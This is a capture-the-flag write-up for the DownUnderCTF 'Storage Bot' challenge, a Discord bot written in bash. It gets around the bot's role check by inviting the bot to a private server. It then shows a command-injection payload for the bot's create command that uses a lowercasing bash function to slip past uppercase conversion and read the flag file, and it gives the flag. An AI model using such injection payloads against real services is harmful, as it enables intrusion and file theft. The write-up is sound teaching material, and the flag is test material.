#### Challenge:

I decided to apply my bash scripting knowledge to create a discord bot called Storage Bot for the DownUnderCTF discord server. I hope it's safe!

---

#### Solution:

- to invoke the bot we need to have `Organiser` role, to go around this we can invite the bot to our custom crafted server:
  - to find the bot id, we need to enable `Discord` development mode and inspect bot profile
  - craft invite link via https://discordapi.com/permissions.html
- inspecting the source code from [storage-bot](https://github.com/Solopie/storage-bot), we can see, that `CREATE` function is vulnerable to code injection, but we need to get around `upperCase` conversion with simple `bash` function `:() { "${@,,}"; };`

```
/create 'FILE; :() { "${@,,}"; }; : CAT /FLAG/FLAG.TXT > SECRET' 'file'
/open /secret
```

---

<details><summary>FLAG:</summary>

```
DUCTF{/flag_didn't_work_for_me...}
```

</details>
<br/>
